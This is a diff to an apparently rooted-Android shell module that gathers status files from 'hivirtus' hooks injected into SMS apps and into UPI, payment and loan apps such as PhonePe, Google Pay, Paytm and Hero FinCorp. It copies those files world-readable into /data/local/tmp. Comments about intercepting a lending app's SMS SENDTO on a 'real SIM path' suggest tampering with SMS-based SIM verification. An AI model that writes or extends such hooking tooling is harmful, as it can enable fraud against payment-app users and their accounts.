@@ -489,11 +489,37 @@ harvest_blocked_outgoing() {
 }
 
 # A16: app writes hook_status to code_cache — root copies to tmp so file manager me dikhe
+# CRITICAL: Messages status alag rakho — GPay/PhonePe harvest se overwrite mat karo
+# (Hero SENDTO → Messages; user hamesha UPI wala file dekh ke confuse hota tha)
 harvest_hook_status() {
-  local best="" latest=""
-  for pkg in com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp \
-             com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm \
-             com.myairtelapp com.yespay.next com.kreditbee.android com.stashfin.android; do
+  local best="" latest="" msg_best="" msg_latest=""
+  local msg_pkgs="com.google.android.apps.messaging com.android.messaging com.samsung.android.messaging com.motorola.messaging com.android.mms com.oneplus.mms com.coloros.mms"
+  local upi_pkgs="com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm com.myairtelapp com.yespay.next com.kreditbee.android com.stashfin.android"
+
+  for pkg in $msg_pkgs; do
+    for f in \
+      "/data/user/0/$pkg/code_cache/hivirtus/hook_status.txt" \
+      "/data/data/$pkg/code_cache/hivirtus/hook_status.txt" \
+      "/data/user/0/$pkg/files/hivirtus_hook_status.txt" \
+      "/data/data/$pkg/files/hivirtus_hook_status.txt"
+    do
+      [ -f "$f" ] && [ -s "$f" ] || continue
+      if [ -z "$msg_best" ] || [ "$f" -nt "$msg_best" ]; then
+        msg_best="$f"
+      fi
+    done
+    for f in \
+      "/data/user/0/$pkg/code_cache/hivirtus/hook_status_latest.txt" \
+      "/data/data/$pkg/code_cache/hivirtus/hook_status_latest.txt"
+    do
+      [ -f "$f" ] && [ -s "$f" ] || continue
+      if [ -z "$msg_latest" ] || [ "$f" -nt "$msg_latest" ]; then
+        msg_latest="$f"
+      fi
+    done
+  done
+
+  for pkg in $upi_pkgs; do
     for f in \
       "/data/user/0/$pkg/code_cache/hivirtus/hook_status.txt" \
       "/data/data/$pkg/code_cache/hivirtus/hook_status.txt" \
@@ -515,16 +541,36 @@ harvest_hook_status() {
       fi
     done
   done
-  [ -f "$MODDIR/hook_status.txt" ] && [ -s "$MODDIR/hook_status.txt" ] && best="$MODDIR/hook_status.txt"
-  if [ -n "$best" ]; then
+
+  # Dedicated Messages file — never clobbered by GPay harvest
+  if [ -n "$msg_best" ]; then
+    cp -f "$msg_best" /data/local/tmp/hivirtus_messages_hook.txt 2>/dev/null
+    chmod 666 /data/local/tmp/hivirtus_messages_hook.txt 2>/dev/null
+  fi
+  if [ -n "$msg_latest" ]; then
+    cp -f "$msg_latest" /data/local/tmp/hivirtus_messages_hook_latest.txt 2>/dev/null
+    chmod 666 /data/local/tmp/hivirtus_messages_hook_latest.txt 2>/dev/null
+  fi
+  # Also keep module copy if native wrote global already
+  if [ -f /data/local/tmp/hivirtus_messages_hook.txt ]; then
+    :
+  elif [ -f "$MODDIR/messages_hook.txt" ]; then
+    cp -f "$MODDIR/messages_hook.txt" /data/local/tmp/hivirtus_messages_hook.txt 2>/dev/null
+  fi
+
+  # Main hook_status: prefer Messages (real SIM path), else UPI debug
+  if [ -n "$msg_best" ]; then
+    cp -f "$msg_best" /data/local/tmp/hivirtus_hook_status.txt 2>/dev/null
+    chmod 666 /data/local/tmp/hivirtus_hook_status.txt 2>/dev/null
+  elif [ -n "$best" ]; then
     cp -f "$best" /data/local/tmp/hivirtus_hook_status.txt 2>/dev/null
     chmod 666 /data/local/tmp/hivirtus_hook_status.txt 2>/dev/null
   fi
-  if [ -n "$latest" ]; then
-    cp -f "$latest" /data/local/tmp/hivirtus_hook_status_latest.txt 2>/dev/null
+  if [ -n "$msg_latest" ]; then
+    cp -f "$msg_latest" /data/local/tmp/hivirtus_hook_status_latest.txt 2>/dev/null
     chmod 666 /data/local/tmp/hivirtus_hook_status_latest.txt 2>/dev/null
-  elif [ -f "$MODDIR/hook_status_latest.txt" ]; then
-    cp -f "$MODDIR/hook_status_latest.txt" /data/local/tmp/hivirtus_hook_status_latest.txt 2>/dev/null
+  elif [ -n "$latest" ]; then
+    cp -f "$latest" /data/local/tmp/hivirtus_hook_status_latest.txt 2>/dev/null
     chmod 666 /data/local/tmp/hivirtus_hook_status_latest.txt 2>/dev/null
   fi
 }
